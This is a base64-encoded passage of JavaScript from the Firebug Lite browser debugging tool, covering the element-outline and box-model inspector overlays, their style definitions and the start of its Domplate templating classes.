NCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgLyoqDQogICAgICogDQogICAgICogICBsbHR0dHR0dHJyDQogICAgICogICBsbHR0dHR0dHJyDQogICAgICogICBsbCAgICAgIHJyDQogICAgICogICBsbCAgICAgIHJyDQogICAgICogICBsbGJiYmJiYnJyDQogICAgICogICBsbGJiYmJiYnJyDQogICAgICovDQogICAgZHJhd091dGxpbmU6IGZ1bmN0aW9uKGVsKQ0KICAgIHsNCiAgICAgICAgdmFyIGJvcmRlciA9IDI7DQogICAgICAgIHZhciBzY3JvbGxiYXJTaXplID0gMTc7DQogICAgICAgIA0KICAgICAgICB2YXIgd2luZG93U2l6ZSA9IEZpcmVidWcuYnJvd3Nlci5nZXRXaW5kb3dTaXplKCk7DQogICAgICAgIHZhciBzY3JvbGxTaXplID0gRmlyZWJ1Zy5icm93c2VyLmdldFdpbmRvd1Njcm9sbFNpemUoKTsNCiAgICAgICAgdmFyIHNjcm9sbFBvc2l0aW9uID0gRmlyZWJ1Zy5icm93c2VyLmdldFdpbmRvd1Njcm9sbFBvc2l0aW9uKCk7DQogICAgICAgIA0KICAgICAgICB2YXIgYm94ID0gRmlyZWJ1Zy5icm93c2VyLmdldEVsZW1lbnRCb3goZWwpOw0KICAgICAgICANCiAgICAgICAgdmFyIHRvcCA9IGJveC50b3A7DQogICAgICAgIHZhciBsZWZ0ID0gYm94LmxlZnQ7DQogICAgICAgIHZhciBoZWlnaHQgPSBib3guaGVpZ2h0Ow0KICAgICAgICB2YXIgd2lkdGggPSBib3gud2lkdGg7DQogICAgICAgIA0KICAgICAgICB2YXIgZnJlZUhvcml6b250YWxTcGFjZSA9IHNjcm9sbFBvc2l0aW9uLmxlZnQgKyB3aW5kb3dTaXplLndpZHRoIC0gbGVmdCAtIHdpZHRoIC0gDQogICAgICAgICAgICAgICAgKCFpc0lFICYmIHNjcm9sbFNpemUuaGVpZ2h0ID4gd2luZG93U2l6ZS5oZWlnaHQgPyAvLyBpcyAqdmVydGljYWwqIHNjcm9sbGJhciB2aXNpYmxlDQogICAgICAgICAgICAgICAgIHNjcm9sbGJhclNpemUgOiAwKTsNCiAgICAgICAgDQogICAgICAgIHZhciBmcmVlVmVydGljYWxTcGFjZSA9IHNjcm9sbFBvc2l0aW9uLnRvcCArIHdpbmRvd1NpemUuaGVpZ2h0IC0gdG9wIC0gaGVpZ2h0IC0NCiAgICAgICAgICAgICAgICAoIWlzSUUgJiYgc2Nyb2xsU2l6ZS53aWR0aCA+IHdpbmRvd1NpemUud2lkdGggPyAvLyBpcyAqaG9yaXpvbnRhbCogc2Nyb2xsYmFyIHZpc2libGUNCiAgICAgICAgICAgICAgICBzY3JvbGxiYXJTaXplIDogMCk7DQogICAgICAgIA0KICAgICAgICB2YXIgbnVtVmVydGljYWxCb3JkZXJzID0gZnJlZVZlcnRpY2FsU3BhY2UgPiAwID8gMiA6IDE7DQogICAgICAgIA0KICAgICAgICB2YXIgbyA9IG91dGxpbmVFbGVtZW50czsNCiAgICAgICAgdmFyIHN0eWxlOw0KICAgICAgICANCiAgICAgICAgc3R5bGUgPSBvLmZiT3V0bGluZVQuc3R5bGU7DQogICAgICAgIHN0eWxlLnRvcCA9IHRvcC1ib3JkZXIgKyAicHgiOw0KICAgICAgICBzdHlsZS5sZWZ0ID0gbGVmdCArICJweCI7DQogICAgICAgIHN0eWxlLmhlaWdodCA9IGJvcmRlciArICJweCI7ICAvLyBUT0RPOiBvbiBpbml0aWFsaXplKCkNCiAgICAgICAgc3R5bGUud2lkdGggPSB3aWR0aCArICJweCI7DQogIA0KICAgICAgICBzdHlsZSA9IG8uZmJPdXRsaW5lTC5zdHlsZTsNCiAgICAgICAgc3R5bGUudG9wID0gdG9wLWJvcmRlciArICJweCI7DQogICAgICAgIHN0eWxlLmxlZnQgPSBsZWZ0LWJvcmRlciArICJweCI7DQogICAgICAgIHN0eWxlLmhlaWdodCA9IGhlaWdodCsgbnVtVmVydGljYWxCb3JkZXJzKmJvcmRlciArICJweCI7DQogICAgICAgIHN0eWxlLndpZHRoID0gYm9yZGVyICsgInB4IjsgIC8vIFRPRE86IG9uIGluaXRpYWxpemUoKQ0KICAgICAgICANCiAgICAgICAgc3R5bGUgPSBvLmZiT3V0bGluZUIuc3R5bGU7DQogICAgICAgIGlmIChmcmVlVmVydGljYWxTcGFjZSA+IDApDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0eWxlLnRvcCA9IHRvcCtoZWlnaHQgKyAicHgiOw0KICAgICAgICAgICAgc3R5bGUubGVmdCA9IGxlZnQgKyAicHgiOw0KICAgICAgICAgICAgc3R5bGUud2lkdGggPSB3aWR0aCArICJweCI7DQogICAgICAgICAgICAvL3N0eWxlLmhlaWdodCA9IGJvcmRlciArICJweCI7IC8vIFRPRE86IG9uIGluaXRpYWxpemUoKSBvciB3b3JzdCBjYXNlPw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgc3R5bGUudG9wID0gLTIqYm9yZGVyICsgInB4IjsNCiAgICAgICAgICAgIHN0eWxlLmxlZnQgPSAtMipib3JkZXIgKyAicHgiOw0KICAgICAgICAgICAgc3R5bGUud2lkdGggPSBib3JkZXIgKyAicHgiOw0KICAgICAgICAgICAgLy9zdHlsZS5oZWlnaHQgPSBib3JkZXIgKyAicHgiOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBzdHlsZSA9IG8uZmJPdXRsaW5lUi5zdHlsZTsNCiAgICAgICAgaWYgKGZyZWVIb3Jpem9udGFsU3BhY2UgPiAwKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHlsZS50b3AgPSB0b3AtYm9yZGVyICsgInB4IjsNCiAgICAgICAgICAgIHN0eWxlLmxlZnQgPSBsZWZ0K3dpZHRoICsgInB4IjsNCiAgICAgICAgICAgIHN0eWxlLmhlaWdodCA9IGhlaWdodCArIG51bVZlcnRpY2FsQm9yZGVycypib3JkZXIgKyAicHgiOw0KICAgICAgICAgICAgc3R5bGUud2lkdGggPSAoZnJlZUhvcml6b250YWxTcGFjZSA8IGJvcmRlciA/IGZyZWVIb3Jpem9udGFsU3BhY2UgOiBib3JkZXIpICsgInB4IjsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0eWxlLnRvcCA9IC0yKmJvcmRlciArICJweCI7DQogICAgICAgICAgICBzdHlsZS5sZWZ0ID0gLTIqYm9yZGVyICsgInB4IjsNCiAgICAgICAgICAgIHN0eWxlLmhlaWdodCA9IGJvcmRlciArICJweCI7DQogICAgICAgICAgICBzdHlsZS53aWR0aCA9IGJvcmRlciArICJweCI7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmICghb3V0bGluZVZpc2libGUpIHRoaXMuc2hvd091dGxpbmUoKTsgICAgICAgIA0KICAgIH0sDQogICAgDQogICAgaGlkZU91dGxpbmU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICghb3V0bGluZVZpc2libGUpIHJldHVybjsNCiAgICAgICAgDQogICAgICAgIGZvciAodmFyIG5hbWUgaW4gb3V0bGluZSkNCiAgICAgICAgICAgIG9mZmxpbmVGcmFnbWVudC5hcHBlbmRDaGlsZChvdXRsaW5lRWxlbWVudHNbbmFtZV0pOw0KDQogICAgICAgIG91dGxpbmVWaXNpYmxlID0gZmFsc2U7DQogICAgfSwNCiAgICANCiAgICBzaG93T3V0bGluZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKG91dGxpbmVWaXNpYmxlKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICBpZiAoYm94TW9kZWxWaXNpYmxlKSB0aGlzLmhpZGVCb3hNb2RlbCgpOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBvdXRsaW5lKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF0uYXBwZW5kQ2hpbGQob3V0bGluZUVsZW1lbnRzW25hbWVdKTsNCiAgICAgICAgDQogICAgICAgIG91dGxpbmVWaXNpYmxlID0gdHJ1ZTsNCiAgICB9LA0KICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gQm94IE1vZGVsDQogICAgDQogICAgZHJhd0JveE1vZGVsOiBmdW5jdGlvbihlbCkNCiAgICB7DQogICAgICAgIC8vIGF2b2lkIGVycm9yIHdoZW4gdGhlIGVsZW1lbnQgaXMgbm90IGF0dGFjaGVkIGEgZG9jdW1lbnQNCiAgICAgICAgaWYgKCFlbCB8fCAhZWwucGFyZW50Tm9kZSkNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgDQogICAgICAgIHZhciBib3ggPSBGaXJlYnVnLmJyb3dzZXIuZ2V0RWxlbWVudEJveChlbCk7DQogICAgICAgIA0KICAgICAgICB2YXIgd2luZG93U2l6ZSA9IEZpcmVidWcuYnJvd3Nlci5nZXRXaW5kb3dTaXplKCk7DQogICAgICAgIHZhciBzY3JvbGxQb3NpdGlvbiA9IEZpcmVidWcuYnJvd3Nlci5nZXRXaW5kb3dTY3JvbGxQb3NpdGlvbigpOw0KICAgICAgICANCiAgICAgICAgLy8gZWxlbWVudCBtYXkgYmUgb2NjbHVkZWQgYnkgdGhlIGNocm9tZSwgd2hlbiBpbiBmcmFtZSBtb2RlDQogICAgICAgIHZhciBvZmZzZXRIZWlnaHQgPSBGaXJlYnVnLmNocm9tZS50eXBlID09ICJmcmFtZSIgPyBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuaGVpZ2h0IDogMDsNCiAgICAgICAgDQogICAgICAgIC8vIGlmIGVsZW1lbnQgYm94IGlzIG5vdCBpbnNpZGUgdGhlIHZpZXdwb3J0LCBkb24ndCBkcmF3IHRoZSBib3ggbW9kZWwNCiAgICAgICAgaWYgKGJveC50b3AgPiBzY3JvbGxQb3NpdGlvbi50b3AgKyB3aW5kb3dTaXplLmhlaWdodCAtIG9mZnNldEhlaWdodCB8fA0KICAgICAgICAgICAgYm94LmxlZnQgPiBzY3JvbGxQb3NpdGlvbi5sZWZ0ICsgd2luZG93U2l6ZS53aWR0aCB8fA0KICAgICAgICAgICAgc2Nyb2xsUG9zaXRpb24udG9wID4gYm94LnRvcCArIGJveC5oZWlnaHQgfHwNCiAgICAgICAgICAgIHNjcm9sbFBvc2l0aW9uLmxlZnQgPiBib3gubGVmdCArIGJveC53aWR0aCApDQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIA0KICAgICAgICB2YXIgdG9wID0gYm94LnRvcDsNCiAgICAgICAgdmFyIGxlZnQgPSBib3gubGVmdDsNCiAgICAgICAgdmFyIGhlaWdodCA9IGJveC5oZWlnaHQ7DQogICAgICAgIHZhciB3aWR0aCA9IGJveC53aWR0aDsNCiAgICAgICAgDQogICAgICAgIHZhciBtYXJnaW4gPSBGaXJlYnVnLmJyb3dzZXIuZ2V0TWVhc3VyZW1lbnRCb3goZWwsICJtYXJnaW4iKTsNCiAgICAgICAgdmFyIHBhZGRpbmcgPSBGaXJlYnVnLmJyb3dzZXIuZ2V0TWVhc3VyZW1lbnRCb3goZWwsICJwYWRkaW5nIik7DQogICAgICAgIHZhciBib3JkZXIgPSBGaXJlYnVnLmJyb3dzZXIuZ2V0TWVhc3VyZW1lbnRCb3goZWwsICJib3JkZXIiKTsNCiAgICAgICAgDQogICAgICAgIGJveE1vZGVsU3R5bGUudG9wID0gdG9wIC0gbWFyZ2luLnRvcCArICJweCI7DQogICAgICAgIGJveE1vZGVsU3R5bGUubGVmdCA9IGxlZnQgLSBtYXJnaW4ubGVmdCArICJweCI7DQogICAgICAgIGJveE1vZGVsU3R5bGUuaGVpZ2h0ID0gaGVpZ2h0ICsgbWFyZ2luLnRvcCArIG1hcmdpbi5ib3R0b20gKyAicHgiOw0KICAgICAgICBib3hNb2RlbFN0eWxlLndpZHRoID0gd2lkdGggKyBtYXJnaW4ubGVmdCArIG1hcmdpbi5yaWdodCArICJweCI7DQogICAgICANCiAgICAgICAgYm94Qm9yZGVyU3R5bGUudG9wID0gbWFyZ2luLnRvcCArICJweCI7DQogICAgICAgIGJveEJvcmRlclN0eWxlLmxlZnQgPSBtYXJnaW4ubGVmdCArICJweCI7DQogICAgICAgIGJveEJvcmRlclN0eWxlLmhlaWdodCA9IGhlaWdodCArICJweCI7DQogICAgICAgIGJveEJvcmRlclN0eWxlLndpZHRoID0gd2lkdGggKyAicHgiOw0KICAgICAgICANCiAgICAgICAgYm94UGFkZGluZ1N0eWxlLnRvcCA9IG1hcmdpbi50b3AgKyBib3JkZXIudG9wICsgInB4IjsNCiAgICAgICAgYm94UGFkZGluZ1N0eWxlLmxlZnQgPSBtYXJnaW4ubGVmdCArIGJvcmRlci5sZWZ0ICsgInB4IjsNCiAgICAgICAgYm94UGFkZGluZ1N0eWxlLmhlaWdodCA9IGhlaWdodCAtIGJvcmRlci50b3AgLSBib3JkZXIuYm90dG9tICsgInB4IjsNCiAgICAgICAgYm94UGFkZGluZ1N0eWxlLndpZHRoID0gd2lkdGggLSBib3JkZXIubGVmdCAtIGJvcmRlci5yaWdodCArICJweCI7DQogICAgICANCiAgICAgICAgYm94Q29udGVudFN0eWxlLnRvcCA9IG1hcmdpbi50b3AgKyBib3JkZXIudG9wICsgcGFkZGluZy50b3AgKyAicHgiOw0KICAgICAgICBib3hDb250ZW50U3R5bGUubGVmdCA9IG1hcmdpbi5sZWZ0ICsgYm9yZGVyLmxlZnQgKyBwYWRkaW5nLmxlZnQgKyAicHgiOw0KICAgICAgICBib3hDb250ZW50U3R5bGUuaGVpZ2h0ID0gaGVpZ2h0IC0gYm9yZGVyLnRvcCAtIHBhZGRpbmcudG9wIC0gcGFkZGluZy5ib3R0b20gLSBib3JkZXIuYm90dG9tICsgInB4IjsNCiAgICAgICAgYm94Q29udGVudFN0eWxlLndpZHRoID0gd2lkdGggLSBib3JkZXIubGVmdCAtIHBhZGRpbmcubGVmdCAtIHBhZGRpbmcucmlnaHQgLSBib3JkZXIucmlnaHQgKyAicHgiOw0KICAgICAgICANCiAgICAgICAgaWYgKCFib3hNb2RlbFZpc2libGUpIHRoaXMuc2hvd0JveE1vZGVsKCk7DQogICAgfSwNCiAgDQogICAgaGlkZUJveE1vZGVsOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoIWJveE1vZGVsVmlzaWJsZSkgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgb2ZmbGluZUZyYWdtZW50LmFwcGVuZENoaWxkKGJveE1vZGVsKTsNCiAgICAgICAgYm94TW9kZWxWaXNpYmxlID0gZmFsc2U7DQogICAgfSwNCiAgICANCiAgICBzaG93Qm94TW9kZWw6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmIChib3hNb2RlbFZpc2libGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICBpZiAob3V0bGluZVZpc2libGUpIHRoaXMuaGlkZU91dGxpbmUoKTsNCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuYnJvd3Nlci5kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiYm9keSIpWzBdLmFwcGVuZENoaWxkKGJveE1vZGVsKTsNCiAgICAgICAgYm94TW9kZWxWaXNpYmxlID0gdHJ1ZTsNCiAgICB9DQoNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gSW5zcGVjdG9yIEludGVybmFscw0KDQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQovLyBTaGFyZWQgdmFyaWFibGVzDQoNCg0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gSW50ZXJuYWwgdmFyaWFibGVzDQoNCnZhciBvZmZsaW5lRnJhZ21lbnQgPSBudWxsOw0KDQp2YXIgYm94TW9kZWxWaXNpYmxlID0gZmFsc2U7DQoNCnZhciBib3hNb2RlbCwgYm94TW9kZWxTdHlsZSwgDQogICAgYm94TWFyZ2luLCBib3hNYXJnaW5TdHlsZSwNCiAgICBib3hCb3JkZXIsIGJveEJvcmRlclN0eWxlLA0KICAgIGJveFBhZGRpbmcsIGJveFBhZGRpbmdTdHlsZSwgDQogICAgYm94Q29udGVudCwgYm94Q29udGVudFN0eWxlOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgcmVzZXRTdHlsZSA9ICJtYXJnaW46MDsgcGFkZGluZzowOyBib3JkZXI6MDsgcG9zaXRpb246YWJzb2x1dGU7IG92ZXJmbG93OmhpZGRlbjsgZGlzcGxheTpibG9jazsiOw0KdmFyIG9mZnNjcmVlblN0eWxlID0gcmVzZXRTdHlsZSArICJ0b3A6LTEyMzRweDsgbGVmdDotMTIzNHB4OyI7DQoNCnZhciBpbnNwZWN0U3R5bGUgPSByZXNldFN0eWxlICsgInotaW5kZXg6IDIxNDc0ODM1MDA7IjsNCnZhciBpbnNwZWN0RnJhbWVTdHlsZSA9IHJlc2V0U3R5bGUgKyAiei1pbmRleDogMjE0NzQ4MzU1MDsgdG9wOjA7IGxlZnQ6MDsgYmFja2dyb3VuZDp1cmwoIiArDQogICAgICAgICAgICAgICAgICAgICAgICBFbnYuTG9jYXRpb24uc2tpbkRpciArICJwaXhlbF90cmFuc3BhcmVudC5naWYpOyI7DQoNCi8vaWYgKEVudi5PcHRpb25zLmVuYWJsZVRyYWNlKSBpbnNwZWN0RnJhbWVTdHlsZSA9IHJlc2V0U3R5bGUgKyAiei1pbmRleDogMjE0NzQ4MzU1MDsgdG9wOiAwOyBsZWZ0OiAwOyBiYWNrZ3JvdW5kOiAjZmYwOyBvcGFjaXR5OiAwLjA1OyBfZmlsdGVyOiBhbHBoYShvcGFjaXR5PTUpOyI7DQoNCnZhciBpbnNwZWN0TW9kZWxPcGFjaXR5ID0gaXNJRSA/ICJmaWx0ZXI6YWxwaGEob3BhY2l0eT04MCk7IiA6ICJvcGFjaXR5OjAuODsiOw0KdmFyIGluc3BlY3RNb2RlbFN0eWxlID0gaW5zcGVjdFN0eWxlICsgaW5zcGVjdE1vZGVsT3BhY2l0eTsNCnZhciBpbnNwZWN0TWFyZ2luU3R5bGUgPSBpbnNwZWN0U3R5bGUgKyAiYmFja2dyb3VuZDogI0VERkY2NDsgaGVpZ2h0OjEwMCU7IHdpZHRoOjEwMCU7IjsNCnZhciBpbnNwZWN0Qm9yZGVyU3R5bGUgPSBpbnNwZWN0U3R5bGUgKyAiYmFja2dyb3VuZDogIzY2NjsiOw0KdmFyIGluc3BlY3RQYWRkaW5nU3R5bGUgPSBpbnNwZWN0U3R5bGUgKyAiYmFja2dyb3VuZDogU2xhdGVCbHVlOyI7DQp2YXIgaW5zcGVjdENvbnRlbnRTdHlsZSA9IGluc3BlY3RTdHlsZSArICJiYWNrZ3JvdW5kOiBTa3lCbHVlOyI7DQoNCg0KdmFyIG91dGxpbmVTdHlsZSA9IHsgDQogICAgZmJIb3Jpem9udGFsTGluZTogImJhY2tncm91bmQ6ICMzODc1RDc7aGVpZ2h0OiAycHg7IiwNCiAgICBmYlZlcnRpY2FsTGluZTogImJhY2tncm91bmQ6ICMzODc1RDc7d2lkdGg6IDJweDsiDQp9Ow0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgbGFzdEluc3BlY3RpbmcgPSAwOw0KdmFyIGZiSW5zcGVjdEZyYW1lID0gbnVsbDsNCg0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgb3V0bGluZVZpc2libGUgPSBmYWxzZTsNCnZhciBvdXRsaW5lRWxlbWVudHMgPSB7fTsNCnZhciBvdXRsaW5lID0gew0KICAiZmJPdXRsaW5lVCI6ICJmYkhvcml6b250YWxMaW5lIiwNCiAgImZiT3V0bGluZUwiOiAiZmJWZXJ0aWNhbExpbmUiLA0KICAiZmJPdXRsaW5lQiI6ICJmYkhvcml6b250YWxMaW5lIiwNCiAgImZiT3V0bGluZVIiOiAiZmJWZXJ0aWNhbExpbmUiDQp9Ow0KDQoNCnZhciBnZXRJbnNwZWN0aW5nVGFyZ2V0ID0gZnVuY3Rpb24oKQ0Kew0KICAgIA0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBTZWN0aW9uDQoNCnZhciBjcmVhdGVJbnNwZWN0b3JGcmFtZSA9IGZ1bmN0aW9uIGNyZWF0ZUluc3BlY3RvckZyYW1lKCkNCnsNCiAgICBmYkluc3BlY3RGcmFtZSA9IGNyZWF0ZUdsb2JhbEVsZW1lbnQoImRpdiIpOw0KICAgIGZiSW5zcGVjdEZyYW1lLmlkID0gImZiSW5zcGVjdEZyYW1lIjsNCiAgICBmYkluc3BlY3RGcmFtZS5maXJlYnVnSWdub3JlID0gdHJ1ZTsNCiAgICBmYkluc3BlY3RGcmFtZS5zdHlsZS5jc3NUZXh0ID0gaW5zcGVjdEZyYW1lU3R5bGU7DQogICAgRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF0uYXBwZW5kQ2hpbGQoZmJJbnNwZWN0RnJhbWUpOw0KfTsNCg0KdmFyIGRlc3Ryb3lJbnNwZWN0b3JGcmFtZSA9IGZ1bmN0aW9uIGRlc3Ryb3lJbnNwZWN0b3JGcmFtZSgpDQp7DQogICAgaWYgKGZiSW5zcGVjdEZyYW1lKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF0ucmVtb3ZlQ2hpbGQoZmJJbnNwZWN0RnJhbWUpOw0KICAgICAgICBmYkluc3BlY3RGcmFtZSA9IG51bGw7DQogICAgfQ0KfTsNCg0KdmFyIGNyZWF0ZU91dGxpbmVJbnNwZWN0b3IgPSBmdW5jdGlvbiBjcmVhdGVPdXRsaW5lSW5zcGVjdG9yKCkNCnsNCiAgICBmb3IgKHZhciBuYW1lIGluIG91dGxpbmUpDQogICAgew0KICAgICAgICB2YXIgZWwgPSBvdXRsaW5lRWxlbWVudHNbbmFtZV0gPSBjcmVhdGVHbG9iYWxFbGVtZW50KCJkaXYiKTsNCiAgICAgICAgZWwuaWQgPSBuYW1lOw0KICAgICAgICBlbC5maXJlYnVnSWdub3JlID0gdHJ1ZTsNCiAgICAgICAgZWwuc3R5bGUuY3NzVGV4dCA9IGluc3BlY3RTdHlsZSArIG91dGxpbmVTdHlsZVtvdXRsaW5lW25hbWVdXTsNCiAgICAgICAgb2ZmbGluZUZyYWdtZW50LmFwcGVuZENoaWxkKGVsKTsNCiAgICB9DQp9Ow0KDQp2YXIgZGVzdHJveU91dGxpbmVJbnNwZWN0b3IgPSBmdW5jdGlvbiBkZXN0cm95T3V0bGluZUluc3BlY3RvcigpDQp7DQogICAgZm9yICh2YXIgbmFtZSBpbiBvdXRsaW5lKQ0KICAgIHsNCiAgICAgICAgdmFyIGVsID0gb3V0bGluZUVsZW1lbnRzW25hbWVdOw0KICAgICAgICBlbC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGVsKTsNCiAgICB9DQp9Ow0KDQp2YXIgY3JlYXRlQm94TW9kZWxJbnNwZWN0b3IgPSBmdW5jdGlvbiBjcmVhdGVCb3hNb2RlbEluc3BlY3RvcigpDQp7DQogICAgYm94TW9kZWwgPSBjcmVhdGVHbG9iYWxFbGVtZW50KCJkaXYiKTsNCiAgICBib3hNb2RlbC5pZCA9ICJmYkJveE1vZGVsIjsNCiAgICBib3hNb2RlbC5maXJlYnVnSWdub3JlID0gdHJ1ZTsNCiAgICBib3hNb2RlbFN0eWxlID0gYm94TW9kZWwuc3R5bGU7DQogICAgYm94TW9kZWxTdHlsZS5jc3NUZXh0ID0gaW5zcGVjdE1vZGVsU3R5bGU7DQogICAgDQogICAgYm94TWFyZ2luID0gY3JlYXRlR2xvYmFsRWxlbWVudCgiZGl2Iik7DQogICAgYm94TWFyZ2luLmlkID0gImZiQm94TWFyZ2luIjsNCiAgICBib3hNYXJnaW5TdHlsZSA9IGJveE1hcmdpbi5zdHlsZTsNCiAgICBib3hNYXJnaW5TdHlsZS5jc3NUZXh0ID0gaW5zcGVjdE1hcmdpblN0eWxlOw0KICAgIGJveE1vZGVsLmFwcGVuZENoaWxkKGJveE1hcmdpbik7DQogICAgDQogICAgYm94Qm9yZGVyID0gY3JlYXRlR2xvYmFsRWxlbWVudCgiZGl2Iik7DQogICAgYm94Qm9yZGVyLmlkID0gImZiQm94Qm9yZGVyIjsNCiAgICBib3hCb3JkZXJTdHlsZSA9IGJveEJvcmRlci5zdHlsZTsNCiAgICBib3hCb3JkZXJTdHlsZS5jc3NUZXh0ID0gaW5zcGVjdEJvcmRlclN0eWxlOw0KICAgIGJveE1vZGVsLmFwcGVuZENoaWxkKGJveEJvcmRlcik7DQogICAgDQogICAgYm94UGFkZGluZyA9IGNyZWF0ZUdsb2JhbEVsZW1lbnQoImRpdiIpOw0KICAgIGJveFBhZGRpbmcuaWQgPSAiZmJCb3hQYWRkaW5nIjsNCiAgICBib3hQYWRkaW5nU3R5bGUgPSBib3hQYWRkaW5nLnN0eWxlOw0KICAgIGJveFBhZGRpbmdTdHlsZS5jc3NUZXh0ID0gaW5zcGVjdFBhZGRpbmdTdHlsZTsNCiAgICBib3hNb2RlbC5hcHBlbmRDaGlsZChib3hQYWRkaW5nKTsNCiAgICANCiAgICBib3hDb250ZW50ID0gY3JlYXRlR2xvYmFsRWxlbWVudCgiZGl2Iik7DQogICAgYm94Q29udGVudC5pZCA9ICJmYkJveENvbnRlbnQiOw0KICAgIGJveENvbnRlbnRTdHlsZSA9IGJveENvbnRlbnQuc3R5bGU7DQogICAgYm94Q29udGVudFN0eWxlLmNzc1RleHQgPSBpbnNwZWN0Q29udGVudFN0eWxlOw0KICAgIGJveE1vZGVsLmFwcGVuZENoaWxkKGJveENvbnRlbnQpOw0KICAgIA0KICAgIG9mZmxpbmVGcmFnbWVudC5hcHBlbmRDaGlsZChib3hNb2RlbCk7DQp9Ow0KDQp2YXIgZGVzdHJveUJveE1vZGVsSW5zcGVjdG9yID0gZnVuY3Rpb24gZGVzdHJveUJveE1vZGVsSW5zcGVjdG9yKCkNCnsNCiAgICBib3hNb2RlbC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGJveE1vZGVsKTsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gU2VjdGlvbg0KDQoNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KLy8gUHJvYmxlbXMgaW4gSUUNCi8vIEZJWEVEIC0gZXZhbCByZXR1cm4NCi8vIEZJWEVEIC0gYWRkRXZlbnRMaXN0ZW5lciBwcm9ibGVtIGluIElFDQovLyBGSVhFRCBkb2MuY3JlYXRlUmFuZ2U/DQovLw0KLy8gY2xhc3MgcmVzZXJ2ZWQgd29yZA0KLy8gdGVzdCBhbGwgaG9uemEgZXhhbXBsZXMgaW4gSUU2IGFuZCBJRTcNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCiggLyoqIEBzY29wZSBzX2RvbXBsYXRlICovIGZ1bmN0aW9uKCkgew0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQovKiogQGNsYXNzICovDQpGQkwuRG9tcGxhdGVUYWcgPSBmdW5jdGlvbiBEb21wbGF0ZVRhZyh0YWdOYW1lKQ0Kew0KICAgIHRoaXMudGFnTmFtZSA9IHRhZ05hbWU7DQp9Ow0KDQovKioNCiAqIEBjbGFzcw0KICogQGV4dGVuZHMgRkJMLkRvbXBsYXRlVGFnDQogKi8NCkZCTC5Eb21wbGF0ZUVtYmVkID0gZnVuY3Rpb24gRG9tcGxhdGVFbWJlZCgpDQp7DQp9Ow0KDQovKioNCiAqIEBjbGFzcw0KICogQGV4dGVuZHMgRkJMLkRvbXBsYXRlVGFnDQogKi8NCkZCTC5Eb21wbGF0ZUxvb3Ag